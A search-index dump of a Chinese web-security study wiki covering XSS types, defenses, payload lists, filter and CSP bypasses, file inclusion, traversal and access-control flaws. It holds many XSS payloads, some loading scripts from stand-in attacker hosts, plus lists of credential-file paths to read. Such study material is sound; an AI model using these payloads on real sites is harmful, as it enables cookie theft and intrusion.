0493316E5A3D4A389374BC5ED3ED8C7AB99817408B4EF64205A5B936BC45155806F9BF419E853D2FCD810781C;promotioncode=Petco-140928;sortby=23;listingimageflag=y;listingimagewidth=300;resultset=full;listingcount=100;;callback=alert(1);/json/scriptscript+src=https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback=confirm(1);//window.proper_d31c1edc_57a8d6de_38/script#GoogleAPIsembed src=//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\)))catch(e)alert(1337)// allowscriptaccess=alwaysscript src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337/scriptng-appng-csp ng-click=$event.view.alert(1337)script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js/script#Yandex:script+src=https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)/scriptscript+src=https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert/script","tags":[null]},{"title":"xss","path":"/wiki/Web知识点/xss/index.html","content":"JSONP 绕过 点击阅读详细内容... 📝 文档 xss绕过 点击阅读详细内容... 📝 文档 绕过 CSP 默认源 点击阅读详细内容... 📝 文档"},{"title":"xss绕过","path":"/wiki/Web知识点/xss/xss绕过.html","content":"XSS绕过总结一、分类反射性XSS存储型XSSDOM型XSS 反射型xss 攻击方式 攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。 攻击步骤 1.攻击者构造出特殊的URL，其中包含恶意代码.2.用户打开有恶意代码的URL时，网站服务器端将恶意代码从URL取出，拼接在HTML返回给浏览器.3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也会被执行。4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。 防御反射型攻击 1.对输入检查对请求参数进行检查，一旦发现可疑的特殊字符就拒绝请求。需要注意的是用户可以绕过浏览器的检查，直接通过Postman等工具进行请求，所以这个检查最好前后端都做。2.对输出进行转义再显示通过上面的介绍可以看出，反射型XSS攻击要进行攻击的话需要在前端页面进行显示。所以在输出数据之前对潜在的威胁的字符进行编码、转义也是防御XSS攻击十分有效的措施。 存储型xss 攻击方式 攻击者在发帖、留言、评论的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。 攻击步骤 1.攻击者将恶意代码提交到目标网站的数据库中。2.用户打开目标网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回给浏览器。3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。4.恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，凋用目标网站接口执行攻击者指定的操作.这种攻击常见于带有用户保存数据的网站功能，如论坛发帖，商品评论，用户私信等。 预防存储型XSS攻击 预防存储型XSS攻击也是从输入和输出两个方面来考虑。1.服务器接收到数据，在存储到数据库之前，进行转义和过滤危险字符;2.前端接收到服务器传递过来的数据，在展示到页面前，先进行转义/过滤;不论是反射型攻击还是存储型，攻击者总需要找到两个要点，即“输入点”与输出点，也只有这两者都满足，XSS攻击才会生效。“输入点”用于向 web页面注入所需的攻击代码，而“输出点”就是攻击代码被执行的地方。 DOM型xss 攻击方式 用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。/*DOM(Document object model)，使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象的一种漏洞。DOM型XSS是基于js上的，不需要与服务器进行交互。*/ 攻击步骤 1.攻击者构造出特殊数据，其中包含恶意代码。2.用户浏览器执行了恶意代码3.恶意窃取用户数据并发送到攻击者的网站，或冒充用户行为，调用目标网站接口执行攻击者指定的操作./*DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端javascript自身的安全漏洞.*/ 其他防范策略 HTTP-only Cookie:禁止JavaScript读取某些敏感Cookie，攻击者完成XSS注入后也无法窃取此Cookie属性：防止脚本冒充用户提交危险操作 在服务端使用HTTP的Content-Security-Policy头部来指定策略，或者在前端设置meta标答。例如只允许加载同域下的资源 应对XSS攻击的主要手段还是编码与过滤两种，编码用于将特殊的符号 “、、、’、””进行html转义，而过滤则是阻止特定的标记、属性、事件。 二、攻击荷载alert font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);prompt/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);prompt(1)/font 会弹输入框，点确定即算执行 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);confirm/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);confirm(1)/font 弹确定取消框 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);open/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);open(javascript:alert(1))/font 既弹窗又能加载伪协议 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);print/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);print()/font 调出打印对话框（部分浏览器） script标签script 标签用于定义客户端脚本scriptalert(xss)/script scriptalert(/xss/)/script scriptalert(document.cookie)/script script src=http://xxx.com/xss.js/script svg标签svg 标签用来在HTML页面中直接嵌入SVG 文件的代码。 // 等价于 svg onload=alert(xss)svg onload=alert(xss)// img标签img 标签定义 HTML 页面中的图像img src=1 onerror=alert(xss)img src=1 onerror=alert(document.cookie)img src=1 onerror=eval(alert(xss))img src=javascript:alert(xss)img src=javascript:alert(String.formCharCode(88,83,83))img src=1 onmouseover=alert(xss) body标签body 标签定义文档的主体。body onload=alert(xss)body onpageshow=alert(xss) video标签video 标签定义视频，比如电影片段或其他视频流。videosource onerror=alert(1)videosource onerror=alert(xss);/videovideo controls onmouseover=alert(xss);/videovideo controls onfocus=alert(xss); autofocus=/videovideo controls onclick=alert(xss);/video style标签style 标签定义 HTML 文档的样式信息。style onload=alert(1)/style input标签input标签规定了用户可以在其中输入数据的输入字段。点击输入框触发/*input onfocus=alert(1);*/input value= onclick=alert(xss) type=textinput name=name value=onmouseover=prompt(xss) bad=input name=name value=scriptalert(xss)/scriptinput onblur=alert(1) autofocusinput autofocusinput onfocus=alert(1); autofocus details 标签details 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。details ontoggle=alert(1);details open ontoggle=alert(1); select 标签select 标签用来创建下拉列表。/*select onfocus=alert(1)/select*/select onfocus=alert(1) autofocus iframe 标签iframe 标签会创建包含另外一个文档的内联框架 /*iframe onload=alert(1);/iframe*/ audio 标签audio 标签定义声音，比如音乐或其他音频流。/*audio src=x onerror=alert(1);*/ textarea 标签`textarea` 标签定义一个多行的文本输入控件。textarea onfocus=alert(1); autofocus marquee 标签marquee onstart=alert(1)/marquee //Chrome不行，火狐和IE都可以 isindex 标签isindex type=image src=1 onerror=alert(1)//仅限于IE link 标签link 标签定义文档与外部资源的关系。在无CSP的情况下才可以使用： link rel=import href=http://47.xxx.xxx.72/evil.js a 标签a href=javascript:alert(1);xss/aa href=x onclick=eval(alert(xss);)xss/aa href=x onmouseover=alert(xss);xss/aa href=x onmouseout=alert(xss);xss/a form标签form action=Javascript:alert(1)input type=submitform method=x action=x onmouseover=alert(xss);input type=submit/form button标签button onclick=alert(1)button onfocus=alert(xss); autofocus=xss/buttonbutton onclick=alert(xss);xss/buttonbutton onmouseover=alert(xss);xss/buttonbutton onmouseout=alert(xss);xss/buttonbutton onmouseup=alert(xss);xss/buttonbutton onmousedown=alert(xss);/button div标签这个需要借助url编码来实现绕过原代码：div onmouseover=alert(1)DIV/div经过url编码：div onmouseover%3dalert%26lpar%3b1%26rpar%3bDIV%2fdiv object标签这个需要借助 data 伪协议和 base64 编码来实现绕过object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=/object p标签p onclick=alert(xss);xss/pp onmouseover=alert(xss);xss/pp onmouseout=alert(xss);xss/pp onmouseup=alert(xss);xss/p 三、绕过思路过滤 危险字符 “ ‘ 绕过空格过滤当空格被过滤了时，我们可以用 / 来代替空格： img/src=x/onerror=alert(1); 空格回车Tab绕过主要和正则对抗空格：img src= javascript:alert(9527); TAB： img src= javasc :ript:alert(9528); 回车： img src= javascript:alert(xss); 绕过引号过滤如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号： img src=x onerror=alert(`xss`); 绕过括号过滤当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误。 img src=x onerror=javascript:window.onerror=alert;throw 1a onmouseover=javascript:window.onerror=alert;throw 1 绕过关键字过滤大小写绕过sCRiPtalert(1);/sCrIpTImG sRc=x onerRor=alert(1); 双写绕过有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过 scrscriptiptalert(1);/scrscriptiptimimgg srsrcc=x onerror=alert(1); 字符串拼接绕过利用eval()函数 与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。 img src=x onerror=a=aler;b=t;c=(1);eval(a+b+c)img src=x onerror=a=`aler`;b=`t`;c=(`xss`);;eval(a+b+c)!--在js中，我们可以用反引号代替单双引号-- 利用top scripttop[al+ert](`xss`);/scriptscripttop[al+ert](xss);/script 拆分法当 Web 应用程序对目标用户的输入长度进行了限制时，这时无法注入较长的xss攻击向量，但是特定情况下，这种限制可以通过拆分法注入的方式进行绕过 scripta=document.write(/scriptscripta=a+script src=ht/scriptscripta=a+tp://note163.com/xs/scriptscripta=a+s.js/script)/scriptscripteval(a)/script/*document.write(script src = http://note163.com/xss.js/script)*/ 上传文件构造xss上传普通文件更改文件名为xss语句 .gifpng 编码绕过浏览器整个解析顺序为3个环节：HTML实体解码 —URL解码 —JS解码（只支持Unicode） HTML 实体编码 我们可以将DOM节点中的内容转化为HTML实体，因为解析HTML之后建立起节点，然后会对DOM节点里面的HTML实体进行解析。HTML 编码主要分为10进制和16进制，格式为以 # 开头以分号 ; 结尾（也可以不带分号）。 !--a href=javascript:alert(xss)test\\/a--!--十进制--a href=#106;#97;#118;#97;#115;#99;#114;#105;#112;#116;#58;#97;#108;#101;#114;#116;#40;#34;#120;#115;#115;#34;#41;test/a !--十六进制--a href=#x6A;#x61;#x76;#x61;#x73;#x63;#x72;#x69;#x70;#x74;#x3A;#x61;#x6C;#x65;#x72;#x74;#x28;#x22;#x78;#x73;#x73;#x22;#x29;test/a !--也可以不带分号--a href=#x6A#x61#x76#x61#x73#x63#x72#x69#x70#x74#x3A#x61#x6C#x65#x72#x74#x28#x22#x78#x73#x73#x22#x29test/a!--img src=x onerror=alert(xss)--!--十进制--img src=x onerror=#97;#108;#101;#114;#116;#40;#34;#120;#115;#115;#34;#41; !--十六进制--img src=x onerror=#x61;#x6C;#x65;#x72;#x74;#x28;#x22;#x78;#x73;#x73;#x22;#x29; !--也可以不带分号--img src=x onerror=#x61#x6C#x65#x72#x74#x28#x22#x78#x73#x73#x22#x29 HTML字符实体，并不是说任何地方都可以使用实体编码，只有处于 “数据状态中的字符引用”、“属性值状态中的字符引用” 和 “RCDATA状态中的字符引用” 这三种状态中的HTML字符实体将会从 #… 形式解码，转化成对应的解码字符并被放入数据缓冲区中。 一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个 符号（后面没有跟 符号）就会进入 标签开始状态(Tag open state) ，然后转变到 标签名状态(Tag name state) 、 前属性名状态(before attribute name state) ……最后进入 数据状态(Data state) 并释放当前标签的token。当解析器处于数据状态(Data state) 时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。 简单的说就是，浏览器对HTML解码之后就开始解析HTML文档，将众多标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。 **数据状态中的字符引用：**数据状态就是解析一个标签内里面的内容，如 div.../div 中的内容，当浏览器解析完 div 标签之后如果发现标签内还含有实体字符的话，就会有一个实体编码解析了 **属性值状态中的字符引用：**属性值状态中的字符引用就好理解了，就是src，herf这样的属性值中的HTML实体，他也是会先进行HTML解码的。 RCDATA状态中的字符引用：然后再来看一下什么是RCDATA转态，这里需要我们先了解一下HTML中有五类元素： 空元素(Void elements)，如 area、br、base 等等。空元素不能容纳任何内容，因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间。 原始文本元素(Raw text elements)，有 和 style。原始文本元素可以容纳文本。 RCDATA元素(RCDATA elements)，有 textarea 和 title。RCDATA元素可以容纳文本和字符引用。 外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素。外部元素可以容纳文本、字符引用、CDATA段、其他元素和注释。 基本元素(Normal elements)，即除了以上4种元素以外的元素。基本元素可以容纳文本、字符引用、其他元素和注释。 注意到RCDATA元素中有 textarea 和 title 两个属性并且有字符引用，也就是当实体字符出现在这两个标签里面的时候，实体字符会被识别并进行HTML编码解析。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”，所以就不会建立新的标签，所以HTML编码的XSS语句触发不了XSS。 HTML的五类元素中，像 script、style 这样的原始文本元素在这个标签内容纳的是文本，所以浏览器在解析到这个标签后，里面内容中的HTML编码并不会被认为是HTML实体引用，所以并不会被解码为相应的字符,不会触发语句原有的结果。但是当在前面加上 svg ，即可成功弹窗。 URL编码我们可以并将src或href属性中的内容进行URL编码，当HTML解析器对src或href中的字符完成HTML解码后，接下来URL解析器会对src或href中的值进行URL解码。 a href=javascript:alert(xss)test/aa href=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29test/aiframe src=javascript:alert(xss)/iframeiframe src=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29/iframe!--伪协议头 javascript: 是不能进行编码的。这里就有一个URL解析过程中的一个细节了，即不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就会导致DOM节点中被编码的“javascript”没有被解码，当然不会被URL解析器识别了。如：http://www.baidu.com 可以被URL编码为 http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d，但是不能把协议也进URL编码：%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d但是伪协议头 javascript: 可以进行HTML编码。-- Javascript 编码我们可以将DOM节点中的内容转化为 Javascript 编码。当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 script、style 这样的标签时，解析器会自动切换到JavaScript解析模式，而 src、 href 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。Javascript 中可以识别的编码类型有： Unicode 编码 八进制编码 十六进制编码 Unicode编码的比较广泛，而八进制和十六进制只有在DOM环境或eval()等函数中才可以用。 Unicode 编码scriptalert(xss)/scriptscript\\u0061\\u006C\\u0065\\u0072\\u0074(xss)/scriptscript\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0078\\u0073\\u0073)/scripta href=javascript:alert(xss)test/aa href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(xss)test/aa href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0078\\u0073\\u0073)test/a!--不能对伪协议头 javascript: 进行 Javascript 编码。并且像圆括号、双引号、单引号这样的符号我们也不能进 Javascript 编码，但是能进行HTML编码。-- 在DOM环境中的JavaScript编码对于八进制编码和十六进制编码，与 Unicode 编码还是有区别，要想让他们能够执行我们要将他们放在DOM环境中scriptalert(xss)/scriptscript\\141\\154\\145\\162\\164(xss)/scripta href=javascript:alert(xss)test/aa href=javascript:\\x61\\x6c\\x65\\x72\\x74(xss)test/a!--如果过滤了 、、、、、% 等等这些字符的话，我们便可以用JavaScript编码的方法将XSS语句全部编码--即 iframe src=javascript:alert(xss)/iframe 的以下编码都可以弹窗：!--Unicode编码--\\u003C\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u0020\\u0073\\u0072\\u0063\\u003D\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003A\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0078\\u0073\\u0073\\u0027\\u0029\\u003E\\u003C\\u002F\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u003E!--八进制编码--\\74\\151\\146\\162\\141\\155\\145\\40\\163\\162\\143\\75\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\72\\141\\154\\145\\162\\164\\50\\47\\170\\163\\163\\47\\51\\76\\74\\57\\151\\146\\162\\141\\155\\145\\76!--十六进制编码--\\x3c\\x69\\x66\\x72\\x61\\x6d\\x65\\x20\\x73\\x72\\x63\\x3d\\x6a\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3a\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\\x3e\\x3c\\x2f\\x69\\x66\\x72\\x61\\x6d\\x65\\x3e 另一种弹窗的方法scriptalert(xss)/scriptscripteval(\\141\\154\\145\\162\\164\\50\\42\\170\\163\\163\\42\\51)/scripta href=javascript:alert(xss)test/aa href=javascript:eval(\\x61\\x6c\\x65\\x72\\x74\\x28\\x22\\x78\\x73\\x73\\x22\\x29)test/aimg src=x onerror=alert(xss)img src=x onerror=eval(\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29) 混合编码a href=javascript:alert(xss)test/a首先对“alert”进行JavaScript Unicode编码：a href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(xss)test/a然后再对 \\u0061\\u006c\\u0065\\u0072\\u0074 进行URL编码：a href=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(xss)test/a最后对标签中的 javascript:%5c%75...%37%34(xss) 整体进行HTML编码即可： svga href=#x6A;#x61;#x76;#x61;#x73;#x63;#x72;#x69;#x70;#x74;#x3A;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x33;#x31;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x36;#x33;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x33;#x35;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x37;#x25;#x33;#x32;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x37;#x25;#x33;#x34;#x28;#x22;#x78;#x73;#x73;#x22;#x29;test/a 四、CSP绕过1.jsonp绕过要求： CSP：font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);script-src self https://www.google.com https://www.youtube.com; object-src none;/font 2.绕过 CSP 默认源要求： CSP 类似font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);Content-Security-Policy: default-src self unsafe-inline;/font， 有效载荷： font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);http://example.lab/csp.php?xss=f=document.createElement%28iframe%29;f.id=pwn;f.src=/robots.txt;f.onload=%28%29=%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;/font script=document.createElement(script);script.src=//remoteattacker.lab/csp.js;window.frames[0].document.head.appendChild(script); 3.绕过 CSP 在线评估(iframe被禁止)要求： CSP或 CSPfont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);inline/font或font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);eval/font 有效载荷： d=document;f=d.createElement(iframe);f.src=d.querySelector(link[href*=.css]).href;d.body.append(f);s=d.createElement(script);s.src=https://[YOUR_XSSHUNTER_USERNAME].xss.ht;setTimeout(function(){f.contentWindow.document.head.append(s);},1000) 4.绕过 CSP 脚本源自身要求： 类似 CSPfont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);script-src self/font 有效载荷： object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==/object 5.绕过 CSP 脚本源数据要求： CSP 就像Mozillafont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);script-src self data:/font官方文档中警告的那样。 有效载荷： script src=data:,alert(1)//script","tags":[null]},{"title":"xxe漏洞","path":"/wiki/Web知识点/xxe漏洞/index.html","content":"xxe漏洞 点击阅读详细内容... 📝 文档"},{"title":"xxe漏洞","path":"/wiki/Web知识点/xxe漏洞/xxe漏洞.html","content":"xxe漏洞","tags":[null]},{"title":"kali操作","path":"/wiki/Web知识点/工具指南/kali操作.html","content":"kali操作 切换rootsudo passwd rootssh连接ssh_configP有关的sshd_config两个P有关的 更新源sudo vim etcaptsources.listdeb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib更新 apt-get update apt-get upgradeapt-get dist-upgradeapt-get clean 安装vim","tags":[null]},{"title":"工具指南","path":"/wiki/Web知识点/工具指南/index.html","content":"kali操作 点击阅读详细内容... 📝 文档"},{"title":"绕过 CSP 默认源","path":"/wiki/Web知识点/xss/绕过 CSP 默认源.html","content":"🔍 攻击原理详解✅ CSP 设置分析font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);default-src self unsafe-inline;/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);self/font：只允许加载同源资源。 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);unsafe-inline/font：允许内联脚本（如 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);alert(1)/font）。 ❌ 不允许从外部域名加载脚本（如 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);//remoteattacker.lab/csp.js/font）。 ✅ 攻击思路：利用 iframe 的“同源”特性虽然主页面不能加载外部脚本，但： iframe 加载的是同源页面（如 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);/robots.txt/font，只要是同源的就行）。 iframe 的内容属于同源，因此可以操作其 DOM。 向 iframe 中注入 **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);/font**，相当于在同源环境中加载外部脚本，从而绕过 CSP 限制。 ✅ 攻击代码逐步解释第一步：创建 iframe 并加载同源页面JavaScript 复制 f = document.createElement(iframe);f.id = pwn;f.src = /robots.txt; // 只要是同源的就行document.body.appendChild(f); 第二步：iframe 加载完成后，向其中注入外部脚本JavaScript 复制 f.onload = () = x = document.createElement(script); x.src = //remoteattacker.lab/csp.js; // 外部恶意脚本 pwn.contentWindow.document.body.appendChild(x); // 注入到 iframe 中; ✅ 简化版代码（你提供的第二段）JavaScript 复制 script = document.createElement(script);script.src = //remoteattacker.lab/csp.js;window.frames[0].document.head.appendChild(script); 这段代码假设页面上已经有一个 iframe（比如前面注入的）。 它直接向 iframe 的 DOM 中插入外部脚本，绕过主页面 CSP。 ⚠️ 关键点总结表格 复制 限制 绕过方式 主页面不能加载外部脚本 不直接加载，而是注入到 同源的 iframe 中 iframe 也受 CSP 限制？ ✅ 但 iframe 的 DOM 可以被主页面操作，只要同源 外部脚本加载成功？ ✅ 因为 iframe 中插入的脚本不受主页面 CSP 限制（它是独立文档） ✅ 防御建议 限制 iframe 使用： 使用 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);frame-ancestors none/font 防止被嵌套。 或使用 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);sandbox/font 属性限制 iframe 权限。 细化 CSP： 不要使用 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);default-src self/font 这么宽松。 明确指定 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);script-src self/font 禁止外部脚本。 禁止 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);unsafe-inline/font 或使用 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);nonce/hash/font 机制。 防止 iframe 被滥用： 对页面中动态创建的 iframe 进行监控或限制。 设置 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);X-Frame-Options: DENY/font 或 font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);SAMEORIGIN/font。","tags":[null]},{"title":"常见密码&路径","path":"/wiki/Web知识点/常见密码&路径/index.html","content":"密码 文件夹 (包含子项) 📂 目录"},{"title":"文件上传","path":"/wiki/Web知识点/文件上传/index.html","content":"文件上传 点击阅读详细内容... 📝 文档"},{"title":"文件下载","path":"/wiki/Web知识点/文件下载/index.html","content":"文件下载 点击阅读详细内容... 📝 文档"},{"title":"文件上传","path":"/wiki/Web知识点/文件上传/文件上传.html","content":"文件上传 http:目标网站include.php?fileuploadmerged.gif 文件头对照表： 类型 魔数（Hex） ASCII 表现 GIF 47 49 46 38 GIF89a JPEG FF D8 ÿØ PNG 89 50 4E 47 ‰PNG","tags":[null]},{"title":"文件下载","path":"/wiki/Web知识点/文件下载/文件下载.html","content":"检测参数值后接上是否为文件或文件链接read.xxx?filenamedown.xxx?filenamereadfile.xxx?filedownfile.xxx?file.. ..\\ . .等%00 ? %23 %20 .等readpath、filepath、path、inputpath、url、data、readfile、menu、META-INF、WEB-INF、","tags":[null]},{"title":"文件包含","path":"/wiki/Web知识点/文件包含/文件包含.html","content":"文件包含 函数include conn.php: 当包含文件出现错误时，发出错误信息，继续执行 include_once conn.php：只包含一次 require conn.php： 当包含出现错误时，发出错误信息，不再执行 require_once conn.php：只包含一次 本地包含本地文件包含就是通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤允许遍历目录的字符注入浏览器并执行。文件包含漏洞还包含当前服务器中的其他文件，同时支持包含Web应用程序的目录，尝试包括你的硬盘的一些内容，例如：C:\\WINDOWS\\system.ini。 php伪协议php://php://input+post数据php://filter/read=convert.base64-encode/resource=index.phpdata://text/plain,?php%20phpinfo();? 远程包含.allow_url_fopen On allow_url_include On 可以在服务器上制作以恶搞恶意文件，通过http或https进行上传，即可达到远程控制 常见的敏感信息路径：Windows系统 c:\\boot.ini 查看系统版本 c:\\windows\\system32\\inetsrv\\MetaBase.xml IIS配置文件 c:\\windows\\repair\\sam 存储Windows系统初次安装的密码 c:\\ProgramFiles\\mysql\\my.ini MySQL配置 c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD MySQL root密码 c:\\windows\\php.ini php 配置信息 LinuxUnix系统 etcpasswd 账户信息 etcshadow 账户密码文件 usrlocalappapache2confhttpd.conf Apache2默认配置文件 usrlocalappapache2confextrahttpd-vhost.conf 虚拟网站配置 usrlocalappphp5libphp.ini PHP相关配置 etchttpdconfhttpd.conf Apache配置文件 etcmy.conf mysql 配置文件","tags":[null]},{"title":"逻辑越权","path":"/wiki/Web知识点/逻辑越权/index.html","content":"挖掘流程 点击阅读详细内容... 📝 文档 越权 点击阅读详细内容... 📝 文档"},{"title":"越权","path":"/wiki/Web知识点/逻辑越权/越权.html","content":"逻辑越权 水平垂直 垂直越权:添加用户 前提条件:获取的添加用户的数据包怎么来的数据包: 1.普通用户前端有操作界面可以抓取数据包 2.通过网站源码本地搭建自己去模拟抓取 3.盲猜 逻辑漏洞简介逻辑漏洞就是指攻击者利用业务功能上的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。 逻辑漏洞的破坏方式并非是向程序添加破坏内容，而是利用逻辑处理不严密或代码问题或固有不足。操作上并不影响程序运行，在逻辑上是顺利执行的。 这种漏洞一般的防护手段或设备无法阻止，因为走的都是合法流量。也没有防护标准。 逻辑漏洞分类越权漏洞 密码修改 密码找回 验证码****漏洞 支付漏洞 短信****轰炸 投票积分抽奖 逻辑漏洞重要性常见的OWASP漏洞，通过漏洞扫描工具，大多支持自动化或者半自动化扫描出来；并且传统的安全防御设备和措施收效甚微； 但逻辑漏洞属于和系统自身功能和逻辑有关系的漏洞，每一家的漏洞出现可能存在一定的独特性，很难复制或者通过规则通过脚本扫描，因此逻辑漏洞大多需要配合代码审计和手动测试才可发现相关漏洞，也是工具无法完全替代人所作的一类漏洞； 越权漏洞概念越权访问（Broken Access Control，简称BAC）是Web应用程序中一种常见的漏洞，由于其存在范围广、危害大，被OWASP列为Web应用十大安全隐患的第二名。 该漏洞是指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定，一旦权限验证不充分，就易致越权漏洞。 其中越权访问分为： 水平越权 垂直越权 